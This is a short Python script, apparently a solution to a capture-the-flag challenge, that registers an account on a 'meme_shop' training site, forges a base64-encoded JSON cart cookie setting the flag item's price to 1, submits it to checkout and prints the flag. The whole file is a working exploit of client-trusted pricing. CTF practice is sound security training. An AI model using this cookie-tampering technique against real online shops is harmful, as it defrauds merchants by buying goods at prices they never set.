import requests
import base64
import json

s = requests.Session()

url = 'http://meme_shop.challs.olicyber.it'

data = {
    'username': "ciaotucheleggimolto",
    'password': "ciaotucheleggiancora",
}

data['passwordConfirm'] = data['password']

r = s.post(f'{url}/register.php', data=data)

tampered_cookie = {
    'flag': {
        'price': 1,
        'qty': 1,
        'item_id': 1,
    }
}

tampered_cookie = json.dumps(tampered_cookie)
tampered_cookie = base64.b64encode(tampered_cookie.encode())
tampered_cookie = tampered_cookie.decode()

s.cookies.set('cart', tampered_cookie)

r = s.post(f'{url}/checkout.php').text

for i in r.split():
    if "flag{" in i.lower():
        print(i)
